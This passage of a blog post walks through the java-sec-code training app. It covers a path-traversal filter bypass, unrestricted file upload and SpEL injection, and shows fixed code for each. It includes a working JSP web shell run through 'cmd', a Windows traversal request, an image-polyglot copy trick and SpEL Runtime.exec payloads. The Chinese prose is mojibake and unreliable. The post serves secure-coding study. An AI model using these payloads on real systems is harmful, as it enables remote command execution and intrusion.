<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">       String temp = filepath;</span><br><span class="line"></span><br><span class="line">       // use while to sovle multi urlencode</span><br><span class="line">       while (temp.indexOf(&#x27;%&#x27;) != -1) &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               temp = URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">           &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">               logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">               return null;</span><br><span class="line">           &#125; catch (Exception e) &#123;</span><br><span class="line">               logger.info(e.toString());</span><br><span class="line">               return null;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#x27;/&#x27;) &#123;</span><br><span class="line">           return null;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return filepath;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹æ–‡ä»¶è·¯å¾„å‚æ•°å¢åŠ äº†è¿‡æ»¤æ–¹æ³•pathFilterï¼Œå¦‚æœæ–‡ä»¶è·¯å¾„å¼€å¤´ä¸º&#x2F;å­—ç¬¦æˆ–è€…å­˜åœ¨..è¿ç»­å­—ç¬¦å‡ºç°å°±è¿”å›ç©ºå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™ç§è¿‡æ»¤åªæ˜¯ç®€å•çš„åº”å¯¹æªæ–½ï¼Œå¦‚æœæ˜¯Windowsæ“ä½œç³»ç»Ÿä¸Šä»¥ç›˜ç¬¦å¼€å§‹çš„è·¯å¾„ï¼Œå°±æ˜¾å¾—æ— èƒ½ä¸ºåŠ›ã€‚ä¾‹å¦‚ä½¿ç”¨\è¯»å–ï¼ˆwindowsä¸‹ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path_traversal/sec?filepath=..\..\..\..\..\windows\win.ini</span><br></pre></td></tr></table></figure>



<h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><h4 id="1-file-upload"><a href="#1-file-upload" class="headerlink" title="1.&#x2F;file&#x2F;upload"></a>1.&#x2F;file&#x2F;upload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        // èµ‹å€¼ç»™uploadStatus.htmlé‡Œçš„åŠ¨æ€å‚æ•°message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:/file/status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        // Get the file and save it somewhere</span><br><span class="line">        byte[] bytes = file.getBytes();</span><br><span class="line">        Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#x27;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:/file/status&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶ä¸Šä¼ åˆ°æ–¹æ³•ä¸­ï¼Œæœªåˆ¤æ–­æ–‡ä»¶çš„ç±»å‹ã€æ‰©å±•åç­‰ä¿¡æ¯ï¼Œä¹Ÿæœªå¯¹ç”Ÿæˆæ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œé‡ç½®ï¼Œåªæ˜¯ç›´æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°æ–‡ä»¶ä¿å­˜ç›®å½•ä¸­ï¼Œä½¿ç”¨æµ‹è¯•æ–‡ä»¶æˆåŠŸä¸Šä¼ ã€‚æ„é€ ä¸€å¥è¯æœ¨é©¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;))) &#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); &#125; %&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¿å­˜ä¸ºshell.jspè¿›è¡Œä¸Šä¼ ï¼Œç„¶åä¼ å…¥å‚æ•°pwd&#x3D;pass&amp;cmd&#x3D;whoami</p>
<p>ä¿®å¤ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/upload/picture&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;</span><br><span class="line">    if (multifile.isEmpty()) &#123;</span><br><span class="line">        return &quot;Please select a file to upload&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String fileName = multifile.getOriginalFilename();</span><br><span class="line">    String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // è·å–æ–‡ä»¶åç¼€å</span><br><span class="line">    String mimeType = multifile.getContentType(); // è·å–MIMEç±»å‹</span><br><span class="line">    String filePath = UPLOADED_FOLDER + fileName;</span><br><span class="line">    File excelFile = convert(multifile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // åˆ¤æ–­æ–‡ä»¶åç¼€åæ˜¯å¦åœ¨ç™½åå•å†…  æ ¡éªŒ1</span><br><span class="line">    String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;</span><br><span class="line">    boolean suffixFlag = false;</span><br><span class="line">    for (String white_suffix : picSuffixList) &#123;</span><br><span class="line">        if (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line">            suffixFlag = true;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!suffixFlag) &#123;</span><br><span class="line">        logger.error(&quot;[-] Suffix error: &quot; + Suffix);</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // åˆ¤æ–­MIMEç±»å‹æ˜¯å¦åœ¨é»‘åå•å†… æ ¡éªŒ2</span><br><span class="line">    String[] mimeTypeBlackList = &#123;</span><br><span class="line">            &quot;text/html&quot;,</span><br><span class="line">            &quot;text/javascript&quot;,</span><br><span class="line">            &quot;application/javascript&quot;,</span><br><span class="line">            &quot;application/ecmascript&quot;,</span><br><span class="line">            &quot;text/xml&quot;,</span><br><span class="line">            &quot;application/xml&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    for (String blackMimeType : mimeTypeBlackList) &#123;</span><br><span class="line">        // ç”¨containsæ˜¯ä¸ºäº†é˜²æ­¢text/html;charset=UTF-8ç»•è¿‡</span><br><span class="line">        if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;</span><br><span class="line">            logger.error(&quot;[-] Mime type error: &quot; + mimeType);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦æ˜¯å›¾ç‰‡ æ ¡éªŒ3</span><br><span class="line">    boolean isImageFlag = isImage(excelFile);</span><br><span class="line">    deleteFile(randomFilePath);</span><br><span class="line"></span><br><span class="line">    if (!isImageFlag) &#123;</span><br><span class="line">        logger.error(&quot;[-] File is not Image&quot;);</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed. Illeagl picture.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        // Get the file and save it somewhere</span><br><span class="line">        byte[] bytes = multifile.getBytes();</span><br><span class="line">        Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        deleteFile(filePath);</span><br><span class="line">        return &quot;Upload failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);</span><br><span class="line">    logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);</span><br><span class="line">    return String.format(&quot;You successfully uploaded &#x27;%s&#x27;&quot;, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­ä¸ºå›¾ç‰‡æ‰å…è®¸ä¸Šä¼ ï¼Œä¸è¿‡ä»å¯é€šè¿‡å…¶ä»–æ–¹å¼ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/shell.jsp muma.png</span><br></pre></td></tr></table></figure>

<h3 id="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h3><p>Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆç®€ç§° <strong>SpEL</strong>ï¼Œå…¨ç§°<strong>Spring Expression Language</strong>ï¼‰æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ã€‚å®ƒè¯­æ³•ç±»ä¼¼äºOGNLï¼ŒMVELå’ŒJBoss ELï¼Œåœ¨æ–¹æ³•è°ƒç”¨å’ŒåŸºæœ¬çš„å­—ç¬¦ä¸²æ¨¡æ¿æä¾›äº†æå¤§åœ°ä¾¿åˆ©ï¼Œä¹Ÿå¼€å‘å‡è½»äº†Javaä»£ç é‡ã€‚å¦å¤– , SpELæ˜¯Springäº§å“ç»„åˆä¸­è¡¨è¾¾è¯„ä¼°çš„åŸºç¡€ï¼Œä½†å®ƒå¹¶ä¸ç›´æ¥ä¸Springç»‘å®š,å¯ä»¥ç‹¬ç«‹ä½¿ç”¨ã€‚</p>
<p>spelè¯­æ³•ä¸­çš„<code>T()</code>æ“ä½œç¬¦ , <code>T()</code>æ“ä½œç¬¦ä¼šè¿”å›ä¸€ä¸ªobject , å®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬è·å–æŸä¸ªç±»çš„é™æ€æ–¹æ³• , ç”¨æ³•<code>T(å…¨é™å®šç±»å).æ–¹æ³•å()</code></p>
<h4 id="1-spel-vuln1"><a href="#1-spel-vuln1" class="headerlink" title="1.&#x2F;spel&#x2F;vuln1"></a>1.&#x2F;spel&#x2F;vuln1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/spel/vuln1&quot;)</span><br><span class="line"> public String spel_vuln1(String value) &#123;</span><br><span class="line">     ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">     return parser.parseExpression(value).getValue().toString();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡spelè¡¨è¾¾å¼å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="2-spel-vuln2"><a href="#2-spel-vuln2" class="headerlink" title="2.&#x2F;spel&#x2F;vuln2"></a>2.&#x2F;spel&#x2F;vuln2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;spel/vuln2&quot;)</span><br><span class="line">    public String spel_vuln2(String value) &#123;</span><br><span class="line">        StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">        SpelExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression expression = parser.parseExpression(value, new TemplateParserContext());</span><br><span class="line">        Object x = expression.getValue(context);    // trigger vulnerability point</span><br><span class="line">        return x.toString();   // response</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ¯”ç¬¬ä¸€å…³å¤šäº†ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œç”¨#{}å¥—ä¸Šå°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h4><p>ä¿®å¤ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;spel/sec&quot;)</span><br><span class="line">  public String spel_sec(String value) &#123;</span><br><span class="line">      SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line">      SpelExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">      Expression expression = parser.parseExpression(value, new TemplateParserContext());</span><br><span class="line">      Object x = expression.getValue(context);</span><br><span class="line">      return x.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ SimpleEvaluationContextè¿›è¡ŒåŠ å›ºï¼Œå®šä¹‰ä¸€ä¸ªåªè¯»çš„ä¸Šä¸‹æ–‡ç¯å¢ƒé˜²æ­¢ä¸å®‰å…¨çš„æ“ä½œ</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinseyy.github.io/2025/06/26/java-sec-code/" title="java-sec-code">https://kinseyy.github.io/2025/06/26/java-sec-code/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/07/07/Javaweb/" rel="prev" title="Javaweb"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Javaweb</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/06/24/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="ctfshow-æ–‡ä»¶ä¸Šä¼ "><span class="post-nav-text">ctfshow-æ–‡ä»¶ä¸Šä¼ </span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å¦‚æœæ‚¨æœ‰ä»»ä½•å…³äºåšå®¢å†…å®¹çš„ç›¸å…³è®¨è®ºï¼Œæ¬¢è¿å‰å¾€ <a href="https://github.com/kinseyy/kinseyy.github.io/discussions" target="_blank">GitHub Discussions</a> ä¸æˆ‘äº¤æµã€‚</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2025/06/26/java-sec-code/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è‹ICPå¤‡17038157å·</a></div><div class="copyright"><span>&copy; 2023 â€“ 2025 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinseyy" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="å¼€å¾€-å‹é“¾æ¥åŠ›"><img src="https://www.travellings.cn/assets/logo.gif" alt="å¼€å¾€-å‹é“¾æ¥åŠ›" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18"]
  if (mourn_days.includes(today)) {
    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script></body></html>